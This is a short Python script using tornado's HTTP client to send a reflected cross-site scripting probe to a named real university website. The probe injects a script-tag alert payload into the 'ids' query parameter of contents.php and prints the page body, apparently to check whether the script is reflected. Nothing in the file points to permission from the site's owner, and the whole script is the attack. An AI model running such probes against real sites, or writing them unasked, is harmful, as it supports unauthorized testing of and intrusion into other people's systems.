# import requests
from tornado import httpclient

xssurl = 'http://ssc.hcmuaf.edu.vn/contents.php?ids=5345&ur=ssc'
myurl = 'http://ssc.hcmuaf.edu.vn/contents.php?ids=5345"><script>alert(123456)</script>&ur=ssc'


headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
    'content-type': 'text/plain'
}

http_client = httpclient.HTTPClient()
try:
    response = http_client.fetch(myurl)
    print response.body
except httpclient.HTTPError as e:
    # HTTPError is raised for non-200 responses; the response
    # can be found in e.response.
    print("Error: " + str(e))
except Exception as e:
    # Other errors are possible, such as IOError.
    print("Error: " + str(e))
http_client.close()
